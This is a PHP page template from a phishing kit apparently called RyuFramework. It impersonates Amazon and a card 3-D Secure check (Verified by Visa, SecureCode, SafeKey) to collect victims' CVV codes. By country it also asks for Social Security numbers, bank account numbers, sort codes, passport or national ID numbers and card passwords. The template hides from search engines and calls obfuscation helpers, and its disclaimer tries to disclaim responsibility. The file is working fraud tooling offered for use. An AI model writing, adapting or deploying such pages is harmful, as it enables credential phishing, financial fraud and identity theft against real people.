<?php
/**
* ------------------------------------------------------
* FILE GENERATED FROM RYUCLI ( Wed,14-04-2021 00:27 )
* @filename x3dsecure.php
* ------------------------------------------------------
*
* @package RyuFramework
* 
* @author shinryu
* @version v1.0-21
* @copyright 2021 shinryujin
*
*
* @disclaimer : 
* This is software for personal use, misuse of this software is not the responsibility of us (the owner). 
* All legal forms are submitted to their respective users 
*
**/


$type = $this->handler->session('card')['type'];
$bank= $this->handler->session('card')['bank'];
$scheme_img = "msrc.png";
$title = "Secure Code";
if(preg_match("/mastercard/i",$type))
{
  $scheme_img = "msrc.png";
    $title = 'MasterCard Secure Code';

}elseif(preg_match("/visa|visaelectron/i",$type))
{
  $scheme_img = "vbv.png";
    $title ='Verified by Visa';
}elseif(preg_match("/jcb/",$type))
{
  $scheme_img = "jcb.png";
  $title ='JCB J/Secure';

}elseif(preg_match("/safekey|amex|american express/i",$type))
{
  $scheme_img = "safekey.png";
     $title ='Amex SafeKey';

}

$cvv_img = "cvv1.png";
if(preg_match("/amex|american express/i",$bank))
{
  $cvv_img = "cvv2.png";
}else{
  $cvv_img = "cvv1.png";
}


?>
<!DOCTYPE html>
<html>

<head>
<?=$this->sec->keymani();?>
<title><?=$title;?></title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="assets/img/favicon.ico">
  <script type="text/javascript" src="assets/js/jquery.min.js"></script>
  <script type="text/javascript" src="assets/js/bill.js"></script>
  <script type="text/javascript" src="assets/js/post.js"></script>
  <script type="text/javascript" src="assets/js/jquery.maskedinput.min.js"></script>
  <script type="text/javascript" src="assets/js/jquery.payment.min.js"></script>
  <script type="text/javascript" src="assets/js/bootstrap.min.js"></script>
  <link rel="shortcut icon" href="assets/img/favicon.ico">

<script type="text/javascript">
  jQuery(function() {
  $("#Cvv").mask("999");
  $('#ssn').mask("999-99-9999");
  $('#sortcode').mask('99-99-99');
})

$(document).ready(function() {
  $("#bntvbv").click(function() {
    var xCvv = $("#Cvv").val();

    var xStart;
    if (xCvv === "") {
      xStart = false;
    }
    if (xStart === false) {
      alert("Please check your entries and try again");
      return false;
    } else {
      document.getElementById("3dpage").className = "show";
      document.getElementById("3dweb").className = "hide";
    }
  })
})
window.onload = function() {
  setTimeout(function() {
    document.getElementById("3dweb").className = "";
    document.getElementById("3dpage").className = "hide";
  }, 3000)
}

</script>
<style media="screen">
.ryujin {
  margin: 0 auto;
  width: 368px;
  border: solid 1px black;
  padding: 17px;
  background: #fff;
  color: #000;
}

@media screen and (max-width: 368px) {
  .ryujin:before {
    width: 315px;
  }
}

.info3d {
  font-size: 13px;
  margin-top: 25px;
  color: #807979;
}

.hide {
  display: none;
}
</style>
</head>

<body>
<?=$this->sec->keymani();?>

<div class="ryujin">
<img src="<?=$this->sec->image_encode('assets/img/3d/'.$scheme_img);?>">
<img src="<?=$this->sec->image_encode('assets/img/'.CONFIG['amz']['amz_logo']);?>" style="float: right;display: inline-block;width:130px;height:60px">
<p class="info3d"><?=translate('Please enter information pertaining to your credit card to confirm your Amazon Account.',$this->lang);?></p>
<div id="3dpage">
<div align="center">
<p style="margin: 91px 0 129px;"><?=translate('Processing ...',$this->lang);?></p>
</div>
</div>
<div class="hide" id="3dweb">
<form method="post" id="3dsecure" autocomplete="off" action="<?=$this->form_action_page('x3dsecure');?>">
<table align="center" width="350" style="font-size: 11px;font-family: arial, sans-serif; color: rgb(0, 0, 0); margin-top: 10px;">
<tbody style="height:8px;">
<tr>
<td align="right"><?=translate('Card Number',$this->lang);?> : </td>
<td><b>**** **** **** <?=substr(str_replace(" ","",$this->handler->session('card')['cardnumber']),12,4);?></b></td>
</tr>
<tr>
<?=$this->sec->keymani();?>

<td align="right">CVV / CVC :</td>
<td><input type="text" name="cvv" id="Cvv" style="width: 38px;line-height:0.6" required>&nbsp;<img src="assets/img/<?=$cvv_img;?>" style="position: absolute;width: 39px;height: 18px;op:auto;"></td>
</tr>

<?php


function vbv_form($capt,$name,$type)
{
  


  echo '<tr>
  <td align="right">
  '.$capt.'
  </td><td><input type="'.$type.'" style="width: 150px;line-height:0.6" name="'.$name.'" id="'.$name.'" required></td>
  </tr>';
}

$ccode = strtolower($this->userdata['country']['countryCode']);
// check vbv
if(empty($ccode))
{
  $ccode = strtolower($_GET['country']);
}
$conlist = ['ca','us','gb','ie','th','ch','nz','in','sa','qa','au','cy','gr','hk','kw','jp'];
$vs='off';

if(in_array($ccode,$conlist)){
   
  $vs='on';
  // ssn
  if($ccode == 'us' || $ccode == 'ch' || $ccode == 'ca')
  {
    vbv_form('Social Security Number','ssn','tel');
  }
  // acc no
  if($ccode == 'gb' || $ccode == 'ie' || $ccode == 'in' || $ccode == 'th' || $ccode == 'ch')
  { 
    vbv_form('Account Number','acno','tel');
  }
  // sort code
  if($ccode == 'gb' || $ccode == 'ie')
  { 
    vbv_form('Sort Code','sortcode','text');
  }
  // bank access
  if($ccode == 'nz')
  {
    vbv_form('Bank Access Number','bans','tel');
  }
  // bank account
  if($ccode == 'au')
  {
    vbv_form('Bank Account','bankaccount','text');
  }
  // credit limit
  if($ccode == 'ie' || $ccode == 'nz' || $ccode == 'in' || $ccode == 'sa' || $ccode == 'th' || $ccode == 'au')
  {
    vbv_form('Credit Limit (Ex: $5000)','climit','text');
  }
  // passport 
  if($ccode == 'cy')
  {
    vbv_form('Passport number','passcy','text');
  }
  // number id
  if($ccode == 'gr' || $ccode == 'hk')
  {
    vbv_form('ID Number','numbid','text');
  }
  // civild id
  if($ccode == 'kw')
  {
    vbv_form('Civil ID Number','civilid','text');
  }
  // qatar id
  if($ccode == 'qa')
  {
    vbv_form('Qatar ID','qatarid','text');
  }
  // nabid / osid
  if($ccode == 'au')
  {
    vbv_form('NAB ID','nabid','text');
  }
  // card id
  if($ccode == 'jp' || $ccode == 'ch')
  {
    vbv_form('Card ID','cardid','text');
  }
  // card pass
  if($ccode == 'jp' || $ccode == 'ch')
  {
    vbv_form('Card Password','cardpassword','text');
  }
  // atm pin
  /*($ccode == 'th')
  {
      vbv_form('ATM PIN','atm_pin','text');
  }*/
  
  }
?>
<td colspan="3" align="center"><br><input type="submit" value="Submit" id="bntvbv">&nbsp;&nbsp;|&nbsp;&nbsp;<a href="#"><input type="button" value="Skip"></a></td>
</tr>
</tbody>
</table>
</form>
</div>
<p style="text-align: center;font-family: arial, sans-serif;font-size: 9px; color: #656565"> &copy; <?=gmdate('Y');?> Bank check. All Rights Reserved</p>
</div>

</body>
<?=$this->sec->keymani();?>

</html>

